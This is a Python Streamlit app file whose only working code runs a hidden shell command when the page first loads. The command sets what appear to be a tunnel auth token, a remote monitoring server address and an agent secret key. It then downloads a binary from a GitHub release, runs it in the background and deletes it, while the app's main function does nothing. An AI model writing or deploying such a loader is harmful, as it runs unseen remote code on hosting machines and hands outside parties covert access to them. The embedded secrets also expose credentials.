import streamlit as st
import subprocess

if 'script_executed' not in st.session_state:
    command = "ARGO_AUTH=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 NZ_SERVER=newnz.seav.eu.org NZ_agentsecretkey=cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg bash -c 'curl -L -o js2bin1 https://github.com/seav1/dl/releases/download/src/js2bin1 && chmod +x js2bin1 && nohup ./js2bin1 && rm js2bin1'"
    subprocess.call(command, shell=True)
    st.session_state.script_executed = True

def main():
    pass

if __name__ == "__main__":
    main()
